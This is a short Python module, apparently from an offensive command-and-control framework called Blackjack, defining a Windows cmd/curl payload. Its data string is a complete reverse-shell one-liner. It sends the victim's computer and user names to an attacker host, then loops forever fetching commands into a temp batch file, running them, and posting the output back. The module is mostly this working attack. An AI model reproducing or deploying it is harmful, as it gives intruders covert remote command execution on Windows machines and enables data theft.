# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'Windows CMD cURL BlackJack',
        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
        'Description' : 'An Http based beacon-like reverse shell that utilizes cURL',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
    }

    meta = {
        'handler' : 'blackjack',
        'type' : 'cmd-curl',
        'os' : 'windows',
        'shell' : 'cmd.exe'
    }

    config = {
        'frequency' : 1
    }

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = '@echo off&cmd /V:ON /C "SET ip=*LHOST*&&SET sid="*BLACKJACKID*: *SESSIONID*"&&SET protocol=http://&&curl !protocol!!ip!/*VERIFY*/!COMPUTERNAME!/!USERNAME! -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/*GETCMD* -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/*POSTRES* -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout *FREQ*" > NUL'
